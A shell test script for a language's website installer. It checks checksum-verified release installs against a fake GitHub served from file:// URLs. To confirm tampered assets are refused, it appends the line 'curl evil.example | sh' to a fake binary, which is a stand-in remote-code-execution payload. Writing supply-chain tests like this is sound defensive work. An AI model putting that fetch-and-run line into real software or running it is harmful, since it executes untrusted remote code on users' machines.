#!/bin/sh
# End-to-end test of the installer the website serves at /install.
#
# C-1 in docs/upcoming/security-audit-plan.md. That endpoint used to run
# `brew install --HEAD`, which built whatever was on main and verified nothing.
# It now bootstraps tvm and installs the latest RELEASE, checksum-verified.
# Three things have to hold for that to be worth anything, and all three are
# asserted here against a fake GitHub built out of file:// URLs -- no network,
# no real release, no Homebrew:
#
#   1. The happy path actually installs a working tur.
#   2. A TAMPERED asset is refused. This is the whole point: before WP7's C-2
#      fix, tvm's checksum step fell through to a successful install every way
#      it could fail to run.
#   3. The script the Worker SERVES is the one tested -- it is fetched from
#      worker.js's own /install route, not copy-pasted, so an edit to the
#      route that breaks the script fails here.
#
# Needs node (to drive the Worker module) and a host with a release target.
# Skips cleanly without either.
set -u

HERE="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
ROOT="$(CDPATH= cd -- "$HERE/../.." && pwd)"

PASS=0
FAIL=0
ok()  { PASS=$((PASS+1)); printf 'ok   - %s\n' "$1"; }
bad() { FAIL=$((FAIL+1)); printf 'FAIL - %s\n' "$1"; }

if ! command -v node >/dev/null 2>&1; then
  echo "SKIP: node is required to render the Worker's /install route"
  exit 0
fi

detect_target() {
  case "$(uname -s)" in
    Linux)  case "$(uname -m)" in
              x86_64|amd64)  echo linux-x86_64 ;;
              aarch64|arm64) echo linux-aarch64 ;;
            esac ;;
    Darwin) case "$(uname -m)" in arm64|aarch64) echo macos-arm64 ;; esac ;;
  esac
}
TARGET="$(detect_target)"
if [ -z "$TARGET" ]; then
  echo "SKIP: no published release target for $(uname -s)/$(uname -m)"
  exit 0
fi

WORK="$(mktemp -d "${TMPDIR:-/tmp}/tur-install-test.XXXXXX")"
# macOS TMPDIR carries a trailing slash, so the template above yields a `//`.
WORK="$(CDPATH= cd -- "$WORK" && pwd)"
trap 'rm -rf "$WORK"' EXIT INT TERM

TAG="v0.94.0"
VER="0.94.0"

# --- the script under test, taken from the route that serves it ------------
cat > "$WORK/render.mjs" <<EOF
import worker from '$ROOT/web/worker.js';
const res = await worker.fetch(new Request('https://turmeric-lang.com/install'), {});
if (res.status !== 200) { console.error('status ' + res.status); process.exit(1); }
process.stdout.write(await res.text());
EOF

if ! node "$WORK/render.mjs" > "$WORK/install.sh" 2>"$WORK/render.err"; then
  bad "render /install from web/worker.js"
  sed 's/^/    /' "$WORK/render.err"
  echo "summary: $PASS passed, $((FAIL+1)) failed"
  exit 1
fi
ok "render /install from web/worker.js"

if [ -s "$WORK/install.sh" ]; then ok "/install is non-empty"; else bad "/install is non-empty"; fi
if sh -n "$WORK/install.sh" 2>"$WORK/syntax.err"; then
  ok "/install is valid POSIX sh"
else
  bad "/install is valid POSIX sh"; sed 's/^/    /' "$WORK/syntax.err"
fi
# The whole point of C-1: no path through this script may install from main.
if grep -q -- "--HEAD" "$WORK/install.sh"; then
  # Mentioning it in the closing hint is fine; RUNNING it is not.
  if grep -q "^[[:space:]]*brew install --HEAD" "$WORK/install.sh"; then
    bad "/install does not run brew install --HEAD"
  else
    ok "/install does not run brew install --HEAD"
  fi
else
  ok "/install does not run brew install --HEAD"
fi

# --- a fake GitHub ----------------------------------------------------------
mkdir -p "$WORK/api/releases"
printf '{"tag_name": "%s", "name": "%s"}\n' "$TAG" "$VER" > "$WORK/api/releases/latest"

# tvm taken from THIS checkout (or TVM_SRC, a checkout of turmeric-lang/tvm),
# which is what makes this a test of that tvm rather than of main. It is served
# two ways, as GitHub does: as release assets (releases cut after tvm moved to
# its own repo) and from raw.githubusercontent.com/<repo>/<tag>/tvm/ (older
# tags, where tvm/ is still in the tagged tree).
TVM_SRC="${TVM_SRC:-$ROOT/tvm}"
mkdir -p "$WORK/raw/$TAG/tvm"
cp "$TVM_SRC/tvm.sh" "$TVM_SRC/install.sh" "$WORK/raw/$TAG/tvm/"
# Marked, so a run can tell which of the two sources it was handed.
echo '# served-from-raw-tag' >> "$WORK/raw/$TAG/tvm/tvm.sh"

# A release: one tarball plus the sha256sums.txt the workflow generates.
STAGE="$WORK/stage"
mkdir -p "$STAGE/bin" "$STAGE/lib" "$STAGE/share/turmeric/stdlib" "$STAGE/include/turi"
cat > "$STAGE/bin/tur" <<EOF
#!/bin/sh
case "\$1" in
  --version|-V) echo "turmeric $VER" ;;
  *) echo "tur($VER): \$*" ;;
esac
EOF
chmod +x "$STAGE/bin/tur"
echo "; fake stdlib" > "$STAGE/share/turmeric/stdlib/list.tur"
echo fake > "$STAGE/lib/libturi.a"
echo fake > "$STAGE/lib/libturt_runtime.a"
echo "/* fake */" > "$STAGE/include/turi/eval.h"

RELDIR="$WORK/releases/$TAG"
mkdir -p "$RELDIR"
ASSET="turmeric-$TAG-$TARGET.tar.gz"
( cd "$STAGE" && tar -czf "$RELDIR/$ASSET" . )
cp "$TVM_SRC/tvm.sh" "$TVM_SRC/install.sh" "$RELDIR/"
( cd "$RELDIR" && { sha256sum "$ASSET" 2>/dev/null || shasum -a 256 "$ASSET"; } > sha256sums.txt )

export TUR_INSTALL_ASSETS="file://$WORK/releases"
export HOME="$WORK/home"; mkdir -p "$HOME"
export TVM_DIR="$WORK/home/.tvm"
export TUR_INSTALL_API="file://$WORK/api"
export TUR_INSTALL_RAW="file://$WORK/raw"
export TVM_RELEASE_BASE_URL="file://$WORK/releases"

# --- 1. the happy path ------------------------------------------------------
if sh "$WORK/install.sh" >"$WORK/run1.log" 2>&1; then
  ok "install succeeds against a good release"
else
  bad "install succeeds against a good release"
  sed 's/^/    /' "$WORK/run1.log" | tail -20
fi

if [ -x "$TVM_DIR/versions/$VER/bin/tur" ]; then
  ok "install lays down a runnable tur"
  got="$("$TVM_DIR/versions/$VER/bin/tur" --version 2>/dev/null)"
  if [ "$got" = "turmeric $VER" ]; then
    ok "installed tur reports $VER"
  else
    bad "installed tur reports $VER (got '$got')"
  fi
else
  bad "install lays down a runnable tur"
fi

# A release that carries tvm as an asset must be bootstrapped from it.
if grep -q "served-from-raw-tag" "$TVM_DIR/tvm.sh" 2>/dev/null; then
  bad "a release with tvm assets bootstraps from the assets"
else
  ok "a release with tvm assets bootstraps from the assets"
fi

# install.sh wires the shell rc, which is how `tur` reaches a new shell's PATH.
if grep -rqF "tvm initialize" "$HOME" 2>/dev/null; then
  ok "install wires the shell rc"
else
  bad "install wires the shell rc"
fi

# --- 2. a tampered asset ----------------------------------------------------
# The attacker who can replace a release asset but not its sha256sums.txt row.
# Before C-2 this installed happily; the version directory is removed first so
# tvm cannot short-circuit on "already installed".
rm -rf "$TVM_DIR/versions/$VER" "$TVM_DIR/cache/downloads"
echo 'curl evil.example | sh' >> "$STAGE/bin/tur"
( cd "$STAGE" && tar -czf "$RELDIR/$ASSET" . )

if sh "$WORK/install.sh" >"$WORK/run2.log" 2>&1; then
  bad "install refuses a tampered asset"
else
  ok "install refuses a tampered asset"
fi
if [ -x "$TVM_DIR/versions/$VER/bin/tur" ]; then
  bad "a refused install leaves no tur behind"
else
  ok "a refused install leaves no tur behind"
fi
if grep -qi "checksum mismatch" "$WORK/run2.log"; then
  ok "the refusal says it was a checksum mismatch"
else
  bad "the refusal says it was a checksum mismatch"
fi

# --- 3. a release cut before tvm moved --------------------------------------
# No tvm assets on the release; tvm/ is still in the tagged tree. Restore the
# good tarball first, since step 2 tampered with it.
rm -rf "$TVM_DIR" "$STAGE/bin/tur"
cat > "$STAGE/bin/tur" <<EOF
#!/bin/sh
case "\$1" in
  --version|-V) echo "turmeric $VER" ;;
  *) echo "tur($VER): \$*" ;;
esac
EOF
chmod +x "$STAGE/bin/tur"
( cd "$STAGE" && tar -czf "$RELDIR/$ASSET" . )
( cd "$RELDIR" && { sha256sum "$ASSET" 2>/dev/null || shasum -a 256 "$ASSET"; } > sha256sums.txt )
rm -f "$RELDIR/tvm.sh" "$RELDIR/install.sh"

if sh "$WORK/install.sh" >"$WORK/run3.log" 2>&1; then
  ok "an old release (no tvm assets) falls back to tvm/ in its tagged tree"
else
  bad "an old release (no tvm assets) falls back to tvm/ in its tagged tree"
  sed 's/^/    /' "$WORK/run3.log" | tail -20
fi
if grep -q "served-from-raw-tag" "$TVM_DIR/tvm.sh" 2>/dev/null; then
  ok "the fallback used the tagged tree's tvm"
else
  bad "the fallback used the tagged tree's tvm"
fi

echo "------------------------------------"
echo "summary: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
